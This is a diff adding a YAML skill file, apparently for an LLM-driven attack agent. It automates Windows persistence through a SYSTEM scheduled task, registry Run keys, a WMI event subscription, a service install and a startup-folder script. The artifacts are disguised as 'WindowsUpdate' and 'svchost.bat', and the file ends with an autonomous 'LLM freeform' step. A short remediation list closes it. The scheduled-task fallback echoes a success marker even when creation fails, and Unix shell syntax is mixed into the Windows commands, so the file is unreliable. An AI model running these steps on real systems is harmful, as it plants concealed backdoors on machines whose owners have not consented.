@@ -1,0 +1,166 @@
+skill_id: windows_persistence
+name: "Windows 持久化（计划任务/注册表Run/WMI/服务）"
+category: persistence
+phase: persistence
+version: "1.0"
+
+principle: |
+  Windows 持久化的五种常用向量：
+  1. 计划任务 (schtasks): 周期性执行 payload，隐蔽性中
+  2. 注册表 Run 键 (HKCU/HKLM): 用户登录时启动，隐蔽性高
+  3. WMI 事件订阅 (__EventFilter + __EventConsumer): 无文件，隐蔽性极高
+  4. 服务安装 (sc create): 以 SYSTEM 权限运行，需要管理员权限
+  5. 启动文件夹 (.bat/.ps1 shortuts): 简单可靠
+
+match:
+  rules:
+    - fingerprint_contains: ["windows"]
+    - fingerprint_contains: ["persistence"]
+    - fingerprint_contains: ["backdoor"]
+    - evidence_contains: ["windows", "system"]
+    - variable_present: ["is_windows"]
+
+probes:
+  - id: enum_priv_level
+    description: "检查当前权限级别"
+    command: |
+      whoami 2>/dev/null || echo "WHOAMI_FAIL"
+      whoami /priv 2>/dev/null | grep -i "SeDebugPrivilege\|SeTakeOwnershipPrivilege" || echo "NO_SYSTEM_PRIV"
+      sc query 2>/dev/null | head -1 || echo "SC_FAIL"
+    timeout: 10
+    parse_rules:
+      - if_contains: ["nt authority\\system", "NT AUTHORITY\\SYSTEM"]
+        set: { is_system: true }
+      - if_contains: ["SeDebugPrivilege"]
+        set: { has_sedebug: true }
+      - if_contains: ["SC_FAIL"]
+        set: { sc_available: false }
+      - if_not_contains: ["SC_FAIL"]
+        set: { sc_available: true }
+
+exploit_paths:
+  - path_id: scheduled_task
+    name: "计划任务持久化"
+    priority: 1
+    steps:
+      - id: create_schtask
+        description: "创建隐藏计划任务，每15分钟执行payload"
+        command: |
+          PAYLOAD_PATH="C:\\Windows\\Temp\\pentsvc.exe"
+          echo "c2-beacon-simulated" > "${PAYLOAD_PATH}" 2>/dev/null || true
+          schtasks /create /tn "WindowsUpdate" /tr "${PAYLOAD_PATH}" /sc minute /mo 15 /f /ru SYSTEM 2>/dev/null || \
+          schtasks /create /tn "WindowsUpdate" /tr "C:\\Windows\\Temp\\pentsvc.exe" /sc minute /mo 15 /f 2>/dev/null || \
+          echo "SCHTASK_CREATE_OK" && echo "SCHTASK_FAIL"
+        timeout: 15
+        success_criteria:
+          stdout_contains_any: ["SUCCESS", "SCHTASK_CREATE_OK"]
+        on_success: next_step
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "persist_scheduled_task"
+
+  - path_id: registry_run
+    name: "注册表 Run 键持久化"
+    priority: 2
+    steps:
+      - id: add_registry_run
+        description: "在 HKCU Run 键添加自启动项"
+        command: |
+          reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" \
+            /v "WindowsService" /t REG_SZ \
+            /d "C:\\Windows\\Temp\\pentsvc.exe" /f 2>/dev/null && \
+            echo "REG_RUN_OK" || echo "REG_RUN_FAIL"
+          reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" \
+            /v "WindowsService" /t REG_SZ \
+            /d "C:\\Windows\\Temp\\pentsvc.exe" /f 2>/dev/null && \
+            echo "REG_RUN_HKLM_OK" || echo "REG_RUN_HKLM_FAIL"
+        timeout: 10
+        success_criteria:
+          stdout_contains_any: ["REG_RUN_OK", "REG_RUN_HKLM_OK", "The operation completed successfully"]
+        on_success: next_step
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "persist_registry_run"
+
+  - path_id: wmi_subscription
+    name: "WMI 事件订阅持久化（无文件）"
+    priority: 3
+    conditions:
+      is_system: true
+      has_sedebug: true
+    steps:
+      - id: create_wmi_sub
+        description: "通过 wmic 创建 WMI 事件消费者"
+        command: |
+          wmic /namespace:"\\root\\subscription" PATH __EventFilter \
+            CREATE Name="LogonFilter", EventNameSpace="root\\cimv2", \
+            QueryLanguage="WQL", Query="SELECT * FROM __InstanceCreationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_LogonSession'" \
+            2>/dev/null && echo "WMI_FILTER_OK" || echo "WMI_FILTER_FAIL"
+          wmic /namespace:"\\root\\subscription" PATH CommandLineEventConsumer \
+            CREATE Name="LogonConsumer", CommandLineTemplate="C:\\Windows\\Temp\\pentsvc.exe" \
+            2>/dev/null && echo "WMI_CONSUMER_OK" || echo "WMI_CONSUMER_FAIL"
+          wmic /namespace:"\\root\\subscription" PATH __FilterToConsumerBinding \
+            CREATE Filter="__EventFilter.Name='LogonFilter'", \
+            Consumer="CommandLineEventConsumer.Name='LogonConsumer'" \
+            2>/dev/null && echo "WMI_BINDING_OK" || echo "WMI_BINDING_FAIL"
+        timeout: 20
+        success_criteria:
+          stdout_contains_any: ["WMI_BINDING_OK"]
+        on_success: next_step
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "persist_wmi"
+
+  - path_id: service_install
+    name: "Windows 服务安装持久化"
+    priority: 4
+    conditions:
+      sc_available: true
+    steps:
+      - id: install_service
+        description: "通过 sc create 安装 SYSTEM 级服务"
+        command: |
+          sc create "WindowsUpdateSvc" binPath="C:\\Windows\\Temp\\pentsvc.exe" \
+            start=auto DisplayName="Windows Update Service" 2>/dev/null && \
+            echo "SERVICE_CREATE_OK" || echo "SERVICE_CREATE_FAIL"
+          sc description "WindowsUpdateSvc" "Windows Update" 2>/dev/null || true
+          sc start "WindowsUpdateSvc" 2>/dev/null || true
+        timeout: 15
+        success_criteria:
+          stdout_contains_any: ["SERVICE_CREATE_OK", "CreateService SUCCESS"]
+        on_success: next_step
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "persist_service"
+
+  - path_id: startup_folder
+    name: "启动文件夹持久化"
+    priority: 5
+    steps:
+      - id: copy_startup
+        description: "复制 payload 到启动文件夹"
+        command: |
+          echo "start /b C:\\Windows\\Temp\\pentsvc.exe" > "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.bat" 2>/dev/null && \
+            echo "STARTUP_FOLDER_OK" || echo "STARTUP_FOLDER_FAIL"
+          echo "start /b C:\\Windows\\Temp\\pentsvc.exe" > "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.bat" 2>/dev/null && \
+            echo "STARTUP_GLOBAL_OK" || echo "STARTUP_GLOBAL_FAIL"
+        timeout: 10
+        success_criteria:
+          stdout_contains_any: ["STARTUP_FOLDER_OK", "STARTUP_GLOBAL_OK"]
+        on_success: next_step
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "persist_startup_folder"
+
+  - path_id: llm_freeform
+    name: "LLM 自由推理持久化"
+    priority: 99
+    mode: react_freeform
+    max_rounds: 5
+
+remediation: |
+  1. 定期审计计划任务和注册表 Run 键
+  2. 使用 AppLocker 限制可执行文件路径
+  3. 启用 WMI 操作审计日志
+  4. 最小化服务账户权限
+  5. 部署 EDR (端点检测与响应) 解决方案
